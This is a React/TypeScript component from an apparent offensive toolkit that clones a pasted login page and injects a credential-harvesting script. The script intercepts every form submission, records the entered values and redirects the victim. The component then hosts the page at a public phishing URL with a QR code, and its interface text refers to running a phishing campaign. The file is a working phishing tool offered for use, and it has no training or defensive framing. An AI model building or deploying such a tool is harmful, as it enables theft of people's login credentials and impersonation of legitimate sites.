
'use client';

import { useState } from 'react';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import { z } from 'zod';
import { Card, CardHeader, CardTitle, CardDescription, CardContent, CardFooter } from '@/components/ui/card';
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from '@/components/ui/form';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { Loader2, AlertTriangle, Globe, Download, Bot, Copy, Wand, StopCircle, Eye, Code } from 'lucide-react';
import { hostClonedPage } from '@/ai/flows/host-cloned-page-flow';
import { useToast } from '@/hooks/use-toast';
import { QrCodeGenerator } from './qr-code-generator';
import { Label } from './ui/label';
import { Textarea } from './ui/textarea';

const pageClonerSchema = z.object({
  htmlContent: z.string().min(100, { message: 'Please paste a valid HTML document.' }),
  redirectUrl: z.string().url({ message: 'Please enter a valid URL for redirection.' }),
});

const getHarvesterScript = (redirectUrl: string) => `
<script>
    function captureAndRedirect(form) {
        try {
            const formData = new FormData(form);
            const credentials = {};
            let capturedData = false;
            
            for (let [key, value] of formData.entries()) {
                if (typeof value === 'string' && value.length > 0) {
                    credentials[key] = value;
                    capturedData = true;
                }
            }
            
            if (capturedData) {
                const entry = {
                    ...credentials,
                    source: window.location.href,
                    timestamp: new Date().toISOString()
                };
                const storageKey = 'netra-captured-credentials';
                try {
                    const existingData = JSON.parse(localStorage.getItem(storageKey) || '[]');
                    const updatedData = [...existingData, entry];
                    localStorage.setItem(storageKey, JSON.stringify(updatedData));
                } catch(e) {
                    console.error('NETRA-X Harvester: Could not save to localStorage.', e);
                }
            }
        } catch (e) {
            console.error('NETRA-X Harvester: Error capturing form data.', e);
        } finally {
            setTimeout(() => {
                window.location.href = '${redirectUrl}';
            }, 150);
        }
    }

    document.addEventListener('submit', function(e) {
        e.preventDefault();
        e.stopPropagation();
        captureAndRedirect(e.target);
    }, true);
</script>
`;

export function LoginPageCloner() {
  const { toast } = useToast();
  const [modifiedHtml, setModifiedHtml] = useState<string | null>(null);
  const [hostedUrlId, setHostedUrlId] = useState<string | null>(null);
  const [showPreview, setShowPreview] = useState(false);
  
  const [isHosting, setIsHosting] = useState(false);
  const [clonerError, setClonerError] = useState<string | null>(null);

  const form = useForm<z.infer<typeof pageClonerSchema>>({
    resolver: zodResolver(pageClonerSchema),
    defaultValues: {
      htmlContent: '',
      redirectUrl: 'https://github.com/password_reset',
    },
  });
  
  const resetState = () => {
      setModifiedHtml(null);
      setHostedUrlId(null);
      setClonerError(null);
      setShowPreview(false);
  }

  const onClonerSubmit = (values: z.infer<typeof pageClonerSchema>) => {
    resetState();
    
    let html = values.htmlContent;
    const harvesterScript = getHarvesterScript(values.redirectUrl);
      
    // Inject the credential harvester script before the closing body tag
    if (html.includes('</body>')) {
      html = html.replace(/<\/body>/i, `${harvesterScript}</body>`);
    } else {
      html += harvesterScript;
    }

    setModifiedHtml(html);
    toast({ title: "HTML Prepared", description: "Credential harvester has been injected into the HTML." });
  };

  const handleHostPage = async () => {
    if (!modifiedHtml) return;
    setIsHosting(true);
    setHostedUrlId(null);
    setClonerError(null);
    try {
      const response = await hostClonedPage({ htmlContent: modifiedHtml });
      setHostedUrlId(response.pasteId);
      toast({ title: "Page is Live", description: "Your page is now accessible at the public URL." });
    } catch (err) {
       const errorMessage = err instanceof Error ? err.message : 'An unknown error occurred.';
       setClonerError(errorMessage);
       console.error(err);
    } finally {
      setIsHosting(false);
    }
  };
  
  const handleStopHosting = () => {
    resetState();
    form.setValue('htmlContent', '');
    toast({
      title: "Hosting Deactivated",
      description: "The public URL has been removed and the form has been reset.",
    });
  };

  const handleDownloadHtml = () => {
    if (modifiedHtml) {
      const blob = new Blob([modifiedHtml], { type: 'text/html' });
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = 'cloned_login.html';
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      URL.revokeObjectURL(url);
      toast({ title: "Download Started", description: "Your cloned HTML file is downloading." });
    }
  };

  const handleCopy = (textToCopy: string) => {
    navigator.clipboard.writeText(textToCopy);
    toast({ title: "Copied!", description: "URL copied to clipboard." });
  }

  const fullHostedUrl = hostedUrlId ? `${window.location.origin}/api/phishing/serve/${hostedUrlId}` : null;
  
  return (
    <>
      <div className="grid lg:grid-cols-5 gap-6">
        <div className="lg:col-span-2 space-y-6">
          <Card>
            <CardHeader>
              <CardTitle>Page Cloner & Host</CardTitle>
              <CardDescription>Paste HTML source code to inject a credential harvester and host it.</CardDescription>
            </CardHeader>
            <CardContent>
              <Form {...form}>
                <form onSubmit={form.handleSubmit(onClonerSubmit)} className="space-y-4">
                  <FormField control={form.control} name="htmlContent" render={({ field }) => ( 
                    <FormItem> 
                      <FormLabel>1. Paste Page HTML</FormLabel>
                      <FormControl>
                        <Textarea placeholder="Right-click on a page, 'View Page Source', and paste the HTML here." {...field} className="h-40 font-mono" />
                      </FormControl>
                      <FormMessage />
                    </FormItem> 
                  )}/>
                  <FormField control={form.control} name="redirectUrl" render={({ field }) => ( <FormItem> <FormLabel>2. Redirect URL (after capture)</FormLabel> <FormControl><Input placeholder="https://example.com/login_failed" {...field} /></FormControl> <FormMessage /> </FormItem> )}/>
                  <Button type="submit">
                    <Wand className="mr-2 h-4 w-4" />
                    Inject Harvester
                  </Button>
                </form>
              </Form>
            </CardContent>
            {modifiedHtml && (
              <CardFooter className="flex-col gap-4">
                <Button onClick={handleHostPage} disabled={isHosting} className="w-full">
                    {isHosting ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : <Globe className="mr-2 h-4 w-4" />}
                    3. Host Page
                </Button>
                 <Button onClick={() => setShowPreview(!showPreview)} variant="secondary" className="w-full">
                    <Eye className="mr-2 h-4 w-4"/> {showPreview ? 'Hide' : 'Show'} Injected Code
                </Button>
                <Button onClick={handleDownloadHtml} variant="outline" className="w-full">
                    <Download className="mr-2 h-4 w-4"/> Download HTML
                </Button>
              </CardFooter>
            )}
          </Card>
          
          {clonerError && <Card className="border-destructive/50"><CardHeader><div className="flex items-center gap-3"><AlertTriangle className="h-6 w-6 text-destructive" /><CardTitle className="text-destructive">Action Failed</CardTitle></div></CardHeader><CardContent><p className="text-sm">{clonerError}</p></CardContent></Card>}
          
          {fullHostedUrl && (
            <QrCodeGenerator url={fullHostedUrl} />
          )}

        </div>

        <div className="lg:col-span-3">
          <Card className="min-h-full">
            <CardHeader>
              <CardTitle>Hosted Page Information</CardTitle>
              <CardDescription>Use the public URL for your phishing campaign. Open it in a new tab to test.</CardDescription>
            </CardHeader>
            <CardContent className="w-full space-y-4">
              {(isHosting) && <div className="flex items-center justify-center h-96"><Loader2 className="h-8 w-8 animate-spin text-muted-foreground" /></div>}
              
              {!modifiedHtml && !isHosting && !showPreview && (
                  <div className="h-96 flex flex-col items-center justify-center text-muted-foreground">
                      <Bot className="h-12 w-12 mb-4" />
                      <p>Paste HTML content to get started.</p>
                  </div>
              )}
              
              {modifiedHtml && !fullHostedUrl && !isHosting && !showPreview && (
                  <div className="h-96 flex flex-col items-center justify-center text-muted-foreground">
                      <Globe className="h-12 w-12 mb-4" />
                      <p>HTML is ready.</p>
                      <p className="font-semibold">Click "Host Page" to get a shareable link.</p>
                  </div>
              )}
              
              {showPreview && (
                 <div className="space-y-2">
                    <Label>Injected HTML Code</Label>
                    <pre className="h-96 border rounded-md p-2 bg-primary/10 text-xs overflow-auto font-mono">
                        <code>{modifiedHtml}</code>
                    </pre>
                </div>
              )}

              {fullHostedUrl && !showPreview && (
                <div className="space-y-4 animate-in fade-in">
                  <div className="space-y-2">
                    <Label htmlFor="public-url">Public URL</Label>
                    <div className="flex items-center gap-2">
                          <Input id="public-url" readOnly value={fullHostedUrl} className="font-mono"/>
                          <Button variant="ghost" size="icon" onClick={() => handleCopy(fullHostedUrl)}><Copy className="h-4 w-4"/></Button>
                    </div>
                    <p className="text-xs text-muted-foreground">This is a publicly accessible, shareable link to your phishing page.</p>
                  </div>

                  <div className="flex flex-wrap gap-2">
                       <Button onClick={handleStopHosting} variant="destructive" className="flex-grow">
                          <StopCircle className="mr-2 h-4 w-4" />
                          Stop Hosting & Reset
                      </Button>
                  </div>
                </div>
              )}
            </CardContent>
          </Card>
        </div>
      </div>
    </>
  );
}
